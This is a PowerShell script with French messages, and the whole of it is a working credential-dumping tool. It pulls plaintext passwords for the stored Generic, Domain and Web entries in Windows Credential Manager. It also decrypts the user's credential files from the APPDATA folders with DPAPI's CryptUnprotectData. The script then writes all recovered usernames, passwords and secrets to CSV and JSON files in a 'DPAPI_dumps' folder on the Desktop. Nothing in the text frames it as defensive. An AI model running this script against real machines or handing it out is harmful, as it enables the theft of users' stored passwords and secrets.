function Convert-HexToBytes {
    param([Parameter(Mandatory)][string]$Hex)
    $Hex = $Hex -replace '\s',''
    if ($Hex.Length % 2 -ne 0) { throw "Hex string invalide" }
    $bytes = [byte[]]::new($Hex.Length / 2)
    for ($i=0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = [Convert]::ToByte($Hex.Substring($i*2,2),16)
    }
    return $bytes
}

function Unprotect-DPAPI {
    param([Parameter(Mandatory)][string]$HexString)
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class DPAPI {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string pszDataDescr,
        IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);
}
"@
    $inBlob = New-Object "DPAPI+DATA_BLOB"
    $outBlob = New-Object "DPAPI+DATA_BLOB"
    try {
        $bytes = Convert-HexToBytes $HexString
        $inBlob.cbData = $bytes.Length
        $inBlob.pbData = [Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
        [Runtime.InteropServices.Marshal]::Copy($bytes, 0, $inBlob.pbData, $bytes.Length)
        $success = [DPAPI]::CryptUnprotectData([ref]$inBlob, $null, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, 0, [ref]$outBlob)
        if (-not $success) { return $null }
        $outBytes = New-Object byte[] $outBlob.cbData
        [Runtime.InteropServices.Marshal]::Copy($outBlob.pbData, $outBytes, 0, $outBlob.cbData)
        if ($outBytes.Length -ge 2 -and $outBytes[0] -eq 0xFF -and $outBytes[1] -eq 0xFE) {
            return [Text.Encoding]::Unicode.GetString($outBytes).Trim([char]0)
        } else {
            return [Text.Encoding]::UTF8.GetString($outBytes).Trim([char]0)
        }
    } finally {
        if ($inBlob.pbData -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::FreeHGlobal($inBlob.pbData) }
        if ($outBlob.pbData -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::FreeHGlobal($outBlob.pbData) }
    }
}

function Get-VaultEntriesExtended {
    [CmdletBinding()]
    param()
    $vaults = @()
    $types = @("Generic","Domain","Web")

    foreach ($type in $types) {
        try {
            $creds = Get-StoredCredential -Type $type -ErrorAction SilentlyContinue 3>$null
			foreach ($c in $creds) {
				$entry = [PSCustomObject]@{
					Type     = $type
					Target   = if ($c.TargetName) { $c.TargetName } else { "<EMPTY>" }
					Username = if ($c.UserName) { $c.UserName } else { "<EMPTY>" }
					Password = $null
				}

				if ($c.UserName -or ($c.Password -and $c.Password.Length -gt 0)) {
					try { 
						$entry.Password = $c.GetNetworkCredential().Password 
					} catch {
						$entry.Password = "<ERROR>"
					}
				}

				$vaults += $entry
			}
        } catch {
            Write-Verbose ("Erreur récupération {0}: {1}" -f $type, $_)
        }
    }
    return $vaults
}

function Get-VaultFilesAndBlobs {
    param(
        [string[]]$Paths = @(
            "$env:APPDATA\Microsoft\Credentials",
            "$env:LOCALAPPDATA\Microsoft\Credentials"
        )
    )

    $results = @()

    foreach ($path in $Paths) {
		Write-Host "[*] Searching in $Paths" -ForegroundColor Yellow
        if (-not (Test-Path $path)) { continue }

        foreach ($file in Get-ChildItem $path -File) {
            try {
                $bytes = [IO.File]::ReadAllBytes($file.FullName)
                $hex = ($bytes | ForEach-Object { $_.ToString("x2") }) -join ""

                $secret = $null
                try { $secret = Unprotect-DPAPI $hex } catch {}

                $results += [PSCustomObject]@{
                    Source = "Credentials"
                    File   = $file.FullName
                    Secret = $secret
                }
            } catch {}
        }
    }

    return $results
}


function Export-VaultData {
    param(
        [Parameter(Mandatory)][object[]]$Data,
        [string]$BaseDir = [Environment]::GetFolderPath("Desktop")
    )

    $resultsDir = Join-Path $BaseDir "DPAPI_dumps"
    $vaultDir    = Join-Path $resultsDir "vault"

    if (-not (Test-Path $resultsDir)) {
        New-Item -ItemType Directory -Path $resultsDir | Out-Null
    }

    if (-not (Test-Path $vaultDir)) {
        New-Item -ItemType Directory -Path $vaultDir | Out-Null
    }

    $csvPath  = Join-Path $vaultDir "vault_dump.csv"
    $jsonPath = Join-Path $vaultDir "vault_dump.json"

    $Data | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
    $Data | ConvertTo-Json -Depth 6 | Out-File $jsonPath -Encoding UTF8
}


# ===============================
# Launch
# ===============================
$allCreds = Get-VaultEntriesExtended
$allBlobs = Get-VaultFilesAndBlobs
$allData  = $allCreds + $allBlobs

if ($allData.Count -gt 0) {
    Export-VaultData -Data $allData
    Write-Host "[+] Windows Vault done, found: $($allData.Count)" -ForegroundColor Green
} else {
    Write-Host "[-] No Windows Vault found" -ForegroundColor Red
}